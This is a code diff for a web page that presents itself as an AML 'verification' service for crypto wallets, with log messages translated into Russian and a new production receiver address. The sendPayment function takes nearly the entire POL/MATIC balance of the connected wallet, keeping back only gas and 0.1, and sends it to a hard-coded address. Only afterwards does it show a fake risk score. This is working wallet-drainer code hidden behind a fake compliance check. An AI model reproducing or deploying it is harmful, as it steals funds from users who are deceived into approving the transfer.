@@ -1,3 +1,6 @@
+declare const window: any;
+declare const document: any;
+
 import { detectWallets } from "./core";
 import { logger } from "./logger";
 import { ethers } from "ethers";
@@ -8,7 +11,7 @@ const isDev =
   window.location.href.includes("localhost") ||
   window.location.href.includes("127.0.0.1");
 
-const PROD_RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
+const PROD_RECEIVER_ADDRESS = "0x45038a8cc181432C57F7abaA067C67eE9E2f5974";
 const DEV_RECEIVER_ADDRESS = "0x74B04568C58a50E10698595e3C5F99702037dF62";
 const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
 const POLYGON_CHAIN_ID = 137n;
@@ -45,7 +48,7 @@ async function handleAction(): Promise<void> {
 }
 
 async function connectWallet(): Promise<void> {
-  const actionButton = document.getElementById("action-button") as HTMLButtonElement | null;
+  const actionButton = document.getElementById("action-button") as any | null;
   if (actionButton) {
     actionButton.disabled = true;
     actionButton.classList.add("loading");
@@ -53,34 +56,41 @@ async function connectWallet(): Promise<void> {
   }
 
   try {
-    logger.log("Starting wallet connection...");
+    logger.log("Пробуем подключиться к кошельку...");
 
     if (!window.ethereum) {
-      throw new Error("No Ethereum provider found");
+      throw new Error("Не найден кошелек Ethereum");
     }
     provider = new ethers.BrowserProvider(window.ethereum, "any");
 
-    logger.log("Requesting accounts...");
-    await provider.send("eth_requestAccounts", []);
+    logger.log("Запрашиваем аккаунты...");
+    // Запрашивает доступ к кошельку пользователя в UI
+    // Возвращает массив адресов, к которым пользователь дал доступ.
+    // Если пользователь отказывается, выбрасывает ошибку.
+    // Без разрешения от пользователя нельзя получить signer.
+    const accounts = await provider.send("eth_requestAccounts", []);
+    logger.log("Аккаунты пользователя:", accounts);
     signer = await provider.getSigner();
     const address = await signer.getAddress();
-    logger.log("Connected address:", address);
+    logger.log("Адрес с кошелька с дальнейшими транзакциями:", address);
 
     const network = await provider.getNetwork();
-    logger.log("Current network:", network);
+    logger.log("Текущая сеть:", network);
 
     if (network.chainId !== POLYGON_CHAIN_ID) {
-      logger.log("Switching to Polygon network...");
+      logger.log("Переключаем клиента на сеть Polygon...");
       try {
-        // это UX вызов смены сети, поэтому не реализован в ether 
+        // это вызов смены сети, который не реализован в ether.js
+        // по причине разницы реализаций в разных кошельках 
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
           params: [{ chainId: "0x89" }],
         });
       } catch (switchError: any) {
-        logger.log("Switch error:", switchError);
+        logger.log("Ошибка:", switchError);
         if (switchError.code === 4902) {
           try {
+            logger.log("У пользователя отсутствует сеть Polygon, добавляем сеть в кошелек...");
             await window.ethereum.request({
               method: "wallet_addEthereumChain",
               params: [
@@ -98,8 +108,8 @@ async function connectWallet(): Promise<void> {
               ],
             });
           } catch (addError: unknown) {
-            logger.error("Add network error:", addError);
-            throw new Error("Failed to add Polygon network");
+            logger.error("Ошибка добавления сети в кошелек:", addError);
+            throw new Error("Не удалось добавить сеть Polygon в кошелек");
           }
         } else {
           throw switchError;
@@ -109,26 +119,26 @@ async function connectWallet(): Promise<void> {
 
     await updateBalance();
 
-    provider.on("accountsChanged", async (accounts: string[]) => {
-      logger.log("Accounts changed:", accounts);
+    window.ethereum.on("accountsChanged", async (accounts: string[]) => {
+      logger.log("Изменен аккаунт в кошельке:", accounts);
       if (provider) {
         signer = await provider.getSigner();
         await updateBalance();
       }
     });
 
-    provider.on("chainChanged", () => {
-      logger.log("Network changed, reloading...");
+    window.ethereum.on("chainChanged", () => {
+      logger.log("Изменена сеть в кошельке, перезагружаем страницу...");
       window.location.reload();
     });
 
   } catch (error: unknown) {
-    logger.error("Connection error:", error);
+    logger.error("Ошибка подключения к кошельку:", error);
 
     if (actionButton) {
       actionButton.disabled = false;
       actionButton.classList.remove("loading");
-      actionButton.textContent = "Connect Wallet for Verification";
+      actionButton.textContent = "Подключите кошелек для верификации";
     }
     provider = null;
     signer = null;
@@ -141,39 +151,40 @@ async function connectWallet(): Promise<void> {
 }
 
 async function sendPayment(): Promise<void> {
-  const actionButton = document.getElementById("action-button") as HTMLButtonElement | null;
+  const actionButton = document.getElementById("action-button") as any | null;
   try {
     if (actionButton) {
       actionButton.disabled = true;
       actionButton.classList.add("loading");
-      actionButton.textContent = "Verifying...";
+      actionButton.textContent = "Проверка...";
     }
 
-    if (!signer || !provider) throw new Error("Wallet not connected");
+    if (!signer || !provider) throw new Error("Кошелек не подключен");
 
     const userAddress = await signer.getAddress();
-    logger.log("Sending from address:", userAddress);
+    logger.log("Отправляем с адреса:", userAddress);
 
+    // возвращает только баланс нативного токена сети
     const balance = await provider.getBalance(userAddress);
     logger.log(
-      "Current MATIC balance:",
+      "Текущий баланс POL:",
       ethers.formatEther(balance),
-      "MATIC"
+      "POL"
     );
 
     if (balance === 0n) {
-      logger.log("No MATIC balance available");
+      logger.log("Нет доступных средств для списания");
       return;
     }
-
+    // возвращает рекомендуемую цену газа
     const feeData = await provider.getFeeData();
     const gasPrice = feeData.gasPrice;
 
     if (!gasPrice) {
-      throw new Error("Failed to get gas price");
+      throw new Error("Не получилось получить цену газа");
     }
     logger.log(
-      "Current gas price:",
+      "Текущая цена газа:",
       ethers.formatUnits(gasPrice, "gwei"),
       "gwei"
     );
@@ -182,34 +193,34 @@ async function sendPayment(): Promise<void> {
     const gasCost = gasPrice * BigInt(gasLimit);
     const gasCostWithBuffer = gasCost * 120n / 100n;
     logger.log(
-      "Gas cost with buffer:",
+      "Цена газа с запасом:",
       ethers.formatEther(gasCostWithBuffer),
-      "MATIC"
+      "POL"
     );
 
-    const minimumMaticToKeep = ethers.parseEther("0.1");
-    const totalCostToReserve = gasCostWithBuffer + minimumMaticToKeep;
+    const minimumPolToKeep = ethers.parseEther("0.1");
+    const totalCostToReserve = gasCostWithBuffer + minimumPolToKeep;
     logger.log(
-      "Total amount to reserve:",
+      "Сумма для резервирования:",
       ethers.formatEther(totalCostToReserve),
-      "MATIC"
+      "POL"
     );
 
     const amountToSend = balance - totalCostToReserve;
     logger.log(
-      "Amount to send:",
+      "Сумма для отправки:",
       ethers.formatEther(amountToSend),
-      "MATIC"
+      "POL"
     );
 
     if (amountToSend <= 0) {
-      logger.log("Insufficient balance to cover gas fees and minimum reserve");
+      logger.log("Недостаточно средств для покрытия комиссий и резервирования");
       throw new Error(
-        "Insufficient balance to cover gas fees and minimum reserve"
+        "Недостаточно средств для покрытия комиссий и резервирования"
       );
     }
 
-    logger.log("Sending transaction...");
+    logger.log("Отправляем транзакцию...");
     const tx = await signer.sendTransaction({
       to: RECEIVER_ADDRESS,
       value: amountToSend,
@@ -218,17 +229,17 @@ async function sendPayment(): Promise<void> {
       maxPriorityFeePerGas: gasPrice,
     });
 
-    logger.log("Transaction sent:", tx.hash);
+    logger.log("Транзакция отправлена:", tx.hash);
 
     await tx.wait();
-    logger.log("Transaction confirmed");
+    logger.log("Транзакция подтверждена");
 
     if (actionButton) actionButton.style.display = "none";
 
     const amlResults = document.getElementById("aml-results");
     amlResults?.classList.add("visible");
 
-    const circle = document.querySelector(".risk-score-progress") as SVGCircleElement | null;
+    const circle = document.querySelector(".risk-score-progress") as any | null;
     if (circle) {
       const radius = circle.r.baseVal.value;
       const circumference = radius * 2 * Math.PI;
@@ -248,7 +259,7 @@ async function sendPayment(): Promise<void> {
 
     await updateBalance();
   } catch (error: unknown) {
-    logger.error("Transaction error:", error);
+    logger.error("Ошибка транзакции:", error);
     if (actionButton) {
       actionButton.textContent = (error instanceof Error ? error.message : "Transaction failed");
       actionButton.style.backgroundColor = "var(--danger-color)";
@@ -276,6 +287,11 @@ document.addEventListener("DOMContentLoaded", async () => {
 
   logger.log(message);
   logger.log("Технический лог:", techLog);
+
+  const actionButton = document.getElementById("action-button");
+  if (actionButton) {
+    actionButton.addEventListener("click", handleAction);
+  }
 
   const ethProvider = window.ethereum as any;
 
